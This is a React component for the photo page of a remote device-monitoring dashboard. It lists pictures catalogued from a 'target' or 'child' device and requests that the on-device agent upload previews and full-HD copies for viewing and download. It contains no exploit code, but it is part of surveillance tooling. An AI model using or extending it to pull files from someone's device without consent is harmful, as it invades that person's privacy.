import React, { useEffect, useState, useMemo } from 'react';
import { useDeviceStore } from '../store/deviceStore';
import { MediaRepository } from '../firebase/mediaRepository';
import type { PictureLogItem } from '../firebase/mediaRepository';
import { 
  Images, Trash2, Download, Search, Calendar, 
  Zap, RefreshCw, FileImage
} from 'lucide-react';

export const Pictures: React.FC = () => {
  const { selectedDevice } = useDeviceStore();
  const [pictures, setPictures] = useState<PictureLogItem[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedDate, setSelectedDate] = useState('');
  const [selectedPictureForView, setSelectedPictureForView] = useState<PictureLogItem | null>(null);
  
  // Tracking which pictures are waiting for cloud uploads
  const [awaitingPreview, setAwaitingPreview] = useState<Record<string, boolean>>({});
  const [awaitingHd, setAwaitingHd] = useState<Record<string, boolean>>({});

  // Subscribe to pictures list from Firestore
  useEffect(() => {
    if (!selectedDevice) return;

    const unsub = MediaRepository.subscribePictureLogs(selectedDevice, (data) => {
      setPictures(data);
    });

    return () => unsub();
  }, [selectedDevice]);

  // Handle requesting thumbnail preview
  const handleRequestPreview = async (pic: PictureLogItem, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (!selectedDevice) return;
    
    setAwaitingPreview(prev => ({ ...prev, [pic.id]: true }));
    try {
      await MediaRepository.requestPicturePreview(selectedDevice, pic.id, pic.path);
      // Auto-hide the loading spinner after 10s if no update occurs
      setTimeout(() => {
        setAwaitingPreview(prev => ({ ...prev, [pic.id]: false }));
      }, 10000);
    } catch (err) {
      console.error('Failed to request preview:', err);
      setAwaitingPreview(prev => ({ ...prev, [pic.id]: false }));
    }
  };

  // Handle requesting full HD upload
  const handleRequestHd = async (pic: PictureLogItem, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (!selectedDevice) return;

    setAwaitingHd(prev => ({ ...prev, [pic.id]: true }));
    try {
      await MediaRepository.requestFullPicture(selectedDevice, pic.id, pic.path);
      // Auto-hide loading spinner after 15s if no update
      setTimeout(() => {
        setAwaitingHd(prev => ({ ...prev, [pic.id]: false }));
      }, 15000);
    } catch (err) {
      console.error('Failed to request full HD picture:', err);
      setAwaitingHd(prev => ({ ...prev, [pic.id]: false }));
    }
  };

  // Handle deleting the picture log
  const handleDeleteLog = async (pic: PictureLogItem, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (!selectedDevice) return;

    if (window.confirm('Delete this picture log entry from cloud records?')) {
      try {
        await MediaRepository.deletePictureLog(selectedDevice, pic.id);
        if (selectedPictureForView?.id === pic.id) {
          setSelectedPictureForView(null);
        }
      } catch (err) {
        console.error('Failed to delete picture log:', err);
        alert('Failed to delete picture log.');
      }
    }
  };

  // Filter logs based on search query & date selection
  const filteredPictures = useMemo(() => {
    return pictures.filter(pic => {
      const matchesSearch = searchQuery.trim() === '' || 
        pic.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
        pic.path.toLowerCase().includes(searchQuery.toLowerCase()) ||
        pic.info.toLowerCase().includes(searchQuery.toLowerCase());

      const matchesDate = !selectedDate || pic.date.includes(selectedDate);
      return matchesSearch && matchesDate;
    });
  }, [pictures, searchQuery, selectedDate]);

  // Aggregate stats
  const stats = useMemo(() => {
    const total = pictures.length;
    const withPreview = pictures.filter(p => !!p.previewUrl).length;
    const withHd = pictures.filter(p => !!p.downloadUrl).length;
    return { total, withPreview, withHd };
  }, [pictures]);

  // Automatically request preview if viewing details of a picture that lacks it
  useEffect(() => {
    if (selectedPictureForView && !selectedPictureForView.previewUrl && !awaitingPreview[selectedPictureForView.id]) {
      handleRequestPreview(selectedPictureForView);
    }
  }, [selectedPictureForView]);

  // Sync state if viewed picture updates in real-time
  const activeViewItem = useMemo(() => {
    if (!selectedPictureForView) return null;
    return pictures.find(p => p.id === selectedPictureForView.id) || selectedPictureForView;
  }, [pictures, selectedPictureForView]);

  return (
    <div className="space-y-6">
      
      {/* ── Page Header ── */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="h-10 w-10 rounded-xl bg-brandCyan/10 border border-brandCyan/20 text-brandCyan flex items-center justify-center">
            <Images className="h-5 w-5" />
          </div>
          <div>
            <h2 className="text-sm font-black text-slate-800 uppercase tracking-wide">Target Pictures Logs</h2>
            <p className="text-[10px] text-mutedText font-semibold mt-0.5">Explore, preview, and download full HD photographs saved on the child device storage</p>
          </div>
        </div>
      </div>

      {/* ── Stats Panels ── */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
        <div className="glass-panel p-4.5 rounded-2xl border border-slate-200/60 bg-white shadow-sm flex items-center justify-between">
          <div>
            <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Total Picture Logs</p>
            <h3 className="text-xl font-black text-slate-800 mt-1">{stats.total}</h3>
          </div>
          <div className="h-10 w-10 bg-slate-100 rounded-xl flex items-center justify-center text-slate-500">
            <FileImage className="h-5 w-5" />
          </div>
        </div>

        <div className="glass-panel p-4.5 rounded-2xl border border-slate-200/60 bg-white shadow-sm flex items-center justify-between">
          <div>
            <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Previews Loaded</p>
            <h3 className="text-xl font-black text-emerald-500 mt-1">{stats.withPreview} <span className="text-[10px] text-slate-400 font-bold">/ {stats.total}</span></h3>
          </div>
          <div className="h-10 w-10 bg-emerald-50 text-emerald-500 rounded-xl flex items-center justify-center">
            <Zap className="h-5 w-5" />
          </div>
        </div>

        <div className="glass-panel p-4.5 rounded-2xl border border-slate-200/60 bg-white shadow-sm flex items-center justify-between">
          <div>
            <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">HD Downloads Ready</p>
            <h3 className="text-xl font-black text-brandCyan mt-1">{stats.withHd} <span className="text-[10px] text-slate-400 font-bold">/ {stats.total}</span></h3>
          </div>
          <div className="h-10 w-10 bg-brandCyan/10 text-brandCyan rounded-xl flex items-center justify-center">
            <Download className="h-5 w-5" />
          </div>
        </div>
      </div>

      {/* ── Filters bar ── */}
      <div className="glass-panel p-4 rounded-2xl border border-slate-200/60 bg-white shadow-sm flex flex-col sm:flex-row gap-3 items-center justify-between">
        <div className="relative w-full sm:w-72">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
          <input
            type="text"
            placeholder="Search by filename, path, size..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full pl-9 pr-4 py-2 border border-slate-200/80 rounded-xl text-xs font-semibold focus:outline-none focus:border-brandCyan bg-slate-50/50"
          />
          {searchQuery && (
            <button 
              onClick={() => setSearchQuery('')}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 font-bold text-xs"
            >
              &times;
            </button>
          )}
        </div>

        <div className="flex items-center gap-3 w-full sm:w-auto justify-end">
          <div className="relative">
            <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400 pointer-events-none" />
            <input
              type="text"
              placeholder="Filter Date (e.g. 2026-06-25)"
              value={selectedDate}
              onChange={(e) => setSelectedDate(e.target.value)}
              className="pl-9 pr-4 py-2 border border-slate-200/80 rounded-xl text-xs font-semibold focus:outline-none focus:border-brandCyan bg-slate-50/50 w-full sm:w-56"
            />
            {selectedDate && (
              <button 
                onClick={() => setSelectedDate('')}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 font-bold text-xs"
              >
                &times;
              </button>
            )}
          </div>
        </div>
      </div>

      {/* ── Pictures Grid ── */}
      {filteredPictures.length === 0 ? (
        <div className="glass-panel p-16 rounded-2xl border border-slate-200/60 bg-white text-center shadow-sm">
          <Images className="h-10 w-10 text-slate-300 mx-auto mb-3" />
          <h4 className="text-xs font-black text-slate-700 uppercase tracking-wide">No Pictures Found</h4>
          <p className="text-[10px] text-mutedText max-w-[280px] mx-auto mt-1.5 leading-relaxed font-semibold">
            {pictures.length === 0 
              ? 'No pictures have been uploaded from the target device. Check back once the child agent catalogs user files.' 
              : 'No picture logs match the current search filters.'}
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
          {filteredPictures.map((pic) => {
            const hasPreview = !!pic.previewUrl;
            const hasHd = !!pic.downloadUrl;
            const isWaitingPreview = awaitingPreview[pic.id];
            
            return (
              <div 
                key={pic.id}
                onClick={() => setSelectedPictureForView(pic)}
                className="group glass-panel border border-slate-200/65 bg-white hover:bg-slate-50/30 hover:border-brandCyan/30 rounded-2xl overflow-hidden p-2.5 shadow-sm hover:shadow-md cursor-pointer transition-all duration-200 flex flex-col justify-between"
              >
                {/* Thumbnail Box */}
                <div className="aspect-video w-full rounded-xl bg-slate-100 overflow-hidden relative border border-slate-200/40 flex items-center justify-center select-none">
                  {hasPreview ? (
                    <img 
                      src={pic.previewUrl!} 
                      alt={pic.name} 
                      className="h-full w-full object-cover group-hover:scale-105 transition-transform duration-300"
                    />
                  ) : (
                    <div className="flex flex-col items-center justify-center p-3 text-center">
                      {isWaitingPreview ? (
                        <RefreshCw className="h-5 w-5 text-brandCyan animate-spin" />
                      ) : (
                        <>
                          <FileImage className="h-5 w-5 text-slate-400 group-hover:text-brandCyan transition-colors" />
                          <button
                            onClick={(e) => handleRequestPreview(pic, e)}
                            className="mt-2 px-2 py-1 bg-brandCyan/10 border border-brandCyan/20 rounded-lg text-[8px] font-black text-brandCyan hover:bg-brandCyan hover:text-white transition-all uppercase tracking-wider"
                          >
                            Load Preview
                          </button>
                        </>
                      )}
                    </div>
                  )}

                  {/* Badges */}
                  {hasHd && (
                    <span className="absolute top-1.5 right-1.5 bg-brandCyan text-white font-black text-[7px] px-1.5 py-0.5 rounded-lg uppercase tracking-wider shadow-sm">
                      HD READY
                    </span>
                  )}
                </div>

                {/* Metadata details */}
                <div className="mt-3 flex-1 flex flex-col justify-between min-w-0">
                  <div>
                    <h4 className="text-[10px] font-black text-slate-800 truncate" title={pic.name}>
                      {pic.name}
                    </h4>
                    <p className="text-[8px] text-mutedText font-semibold truncate mt-0.5" title={pic.path}>
                      {pic.path}
                    </p>
                  </div>

                  <div className="flex items-center justify-between mt-3 pt-2.5 border-t border-slate-100/60">
                    <span className="text-[8px] font-mono text-slate-400 font-bold">
                      {pic.info}
                    </span>
                    
                    {/* Action buttons list */}
                    <div className="flex items-center gap-1">
                      <button
                        onClick={(e) => handleDeleteLog(pic, e)}
                        className="p-1 text-slate-400 hover:text-rose-500 hover:bg-rose-50 rounded-lg border border-transparent hover:border-rose-100 transition-all"
                        title="Delete log"
                      >
                        <Trash2 className="h-3.5 w-3.5" />
                      </button>
                    </div>
                  </div>
                </div>

              </div>
            );
          })}
        </div>
      )}

      {/* ── Telemetry Lightbox Dialog ── */}
      {activeViewItem && (
        <div className="fixed inset-0 bg-slate-900/40 backdrop-blur-md flex items-center justify-center z-[1000] p-4 select-none animate-fadeIn">
          <div className="bg-white border border-slate-200/60 rounded-3xl w-full max-w-[500px] shadow-2xl overflow-hidden p-6 relative flex flex-col gap-5">
            
            {/* Header */}
            <div className="flex justify-between items-center pb-2 border-b border-slate-100">
              <h3 className="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center gap-2">
                <Images className="h-4 w-4 text-brandCyan" />
                Picture Telemetry Viewer
              </h3>
              <button 
                onClick={() => setSelectedPictureForView(null)}
                className="p-1 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-xl transition-all font-black text-lg"
                title="Close"
              >
                &times;
              </button>
            </div>

            {/* Display Area (Image Preview or Loader) */}
            <div className="w-full h-64 rounded-2xl bg-slate-50 border border-slate-100 overflow-hidden relative flex items-center justify-center shadow-inner">
              {activeViewItem.previewUrl ? (
                <img 
                  src={activeViewItem.previewUrl} 
                  alt={activeViewItem.name} 
                  className="w-full h-full object-contain"
                />
              ) : (
                <div className="flex flex-col items-center gap-2 text-center p-6">
                  <RefreshCw className="h-8 w-8 text-brandCyan animate-spin" />
                  <p className="text-[10px] font-black text-slate-700 uppercase tracking-widest mt-1">Requesting thumbnail from child...</p>
                  <p className="text-[8px] text-mutedText max-w-[200px] leading-relaxed font-semibold">
                    The child agent is generating and uploading a compressed preview of this file.
                  </p>
                </div>
              )}
            </div>

            {/* Telemetry Metadata Details */}
            <div className="space-y-2.5">
              <div className="flex justify-between text-xs font-bold py-1 border-b border-slate-100/60">
                <span className="text-slate-400">File Name</span>
                <span className="text-slate-700 truncate max-w-[280px]" title={activeViewItem.name}>{activeViewItem.name}</span>
              </div>
              <div className="flex justify-between text-xs font-bold py-1 border-b border-slate-100/60">
                <span className="text-slate-400">File Size</span>
                <span className="text-slate-700">{activeViewItem.info}</span>
              </div>
              <div className="flex justify-between text-xs font-bold py-1 border-b border-slate-100/60">
                <span className="text-slate-400">Storage Path</span>
                <span className="text-slate-700 text-[10px] truncate max-w-[280px]" title={activeViewItem.path}>{activeViewItem.path}</span>
              </div>
              <div className="flex justify-between text-xs font-bold py-1 border-b border-slate-100/60">
                <span className="text-slate-400">Capture Date</span>
                <span className="text-slate-700">{activeViewItem.date}</span>
              </div>
            </div>

            {/* Actions Footer */}
            <div className="flex items-center gap-3 mt-2">
              {activeViewItem.downloadUrl ? (
                <a
                  href={activeViewItem.downloadUrl}
                  download={activeViewItem.name}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 py-3.5 bg-brandCyan hover:bg-brandCyan/95 text-white rounded-xl text-xs font-black transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow"
                >
                  <Download className="h-4 w-4" />
                  Download HD Image
                </a>
              ) : (
                <button
                  onClick={() => handleRequestHd(activeViewItem)}
                  disabled={awaitingHd[activeViewItem.id]}
                  className="flex-1 py-3.5 bg-brandCyan/10 border border-brandCyan/30 hover:bg-brandCyan/20 text-brandCyan disabled:bg-slate-50 disabled:border-slate-200 disabled:text-slate-400 rounded-xl text-xs font-black transition-all flex items-center justify-center gap-2"
                >
                  {awaitingHd[activeViewItem.id] ? (
                    <>
                      <RefreshCw className="h-4 w-4 animate-spin" />
                      Awaiting Upload...
                    </>
                  ) : (
                    <>
                      <Download className="h-4 w-4" />
                      Request Full HD Image
                    </>
                  )}
                </button>
              )}

              <button
                onClick={() => handleDeleteLog(activeViewItem)}
                className="px-4 py-3.5 bg-rose-500 hover:bg-rose-600 text-white rounded-xl text-xs font-black transition-all flex items-center justify-center gap-1.5 shadow-sm hover:shadow"
                title="Delete telemetry log"
              >
                <Trash2 className="h-4 w-4" />
                Delete Log
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
};
